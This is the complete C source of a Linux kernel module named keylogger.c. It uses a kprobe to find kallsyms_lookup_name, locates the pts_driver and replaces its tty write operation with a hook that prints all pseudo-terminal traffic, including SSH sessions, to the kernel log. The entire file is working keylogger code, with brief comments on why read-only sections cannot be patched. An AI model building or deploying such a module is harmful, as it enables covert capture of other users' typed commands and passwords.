/*
 * keylogger.c
 * v5.7+ (no kallsyms_lookup_name)
 */

#include <linux/kprobes.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/tty.h>
#include <linux/delay.h>
#include <linux/tty_driver.h>

static struct tty_driver *driver = NULL;
static struct tty_operations *original_ops = NULL;
static struct tty_operations *modified_ops = NULL;

// To save original pts write
static ssize_t (*original_write)(struct tty_struct *tty, const u8 *buf, size_t c);

static ssize_t hooked_write(struct tty_struct *tty, const u8 *buf, size_t len)
{
	// WARN: this might flood dmesg buffer
	pr_info("%s\n", buf);
	return original_write(tty, buf, len);
}

static int tty_keylogger_init(void)
{
	struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
	unsigned long (*kallsyms_lookup_name)(const char *name);

	if (register_kprobe(&kp) < 0)
		return 0;

	kallsyms_lookup_name = (unsigned long (*)(const char *name))kp.addr;
	unregister_kprobe(&kp);

	driver = *(struct tty_driver **)kallsyms_lookup_name("pts_driver");
	if (!driver) {
		pr_err("Failed to find the address of pts_driver symbol\n");
		return -EINVAL;
	}

	pr_info("Driver Lookup: %s\n", driver->driver_name);
	original_ops = (struct tty_operations *)driver->ops;
	original_write = original_ops->write;

	// below won't work since ops(pty_unix98_ops) is defined as const.
	// const values are stored in .rodata section and can't be changed.
	//
	// Even with CR0 WP bit 0 (like editing write protected .data section)
	// .rodata is write protected with page table level. (not only PTE RO)
	/* original_ops->write = hooked_write; */

	modified_ops = kzalloc(sizeof(struct tty_operations), GFP_KERNEL);
	memcpy(modified_ops, original_ops, sizeof(struct tty_operations));
	modified_ops->write = hooked_write;
	driver->ops = modified_ops;

	pr_info("TTY keylogger module loaded %px %px\n", driver, original_write);
	return 0;
}

static void __exit tty_keylogger_exit(void)
{
	if (driver && original_ops) {
		driver->ops = original_ops;
	}
	kfree(modified_ops);
	pr_info("TTY keylogger module unloaded\n");
}

module_init(tty_keylogger_init);
module_exit(tty_keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A kernel module to log TTY inputs including SSH");
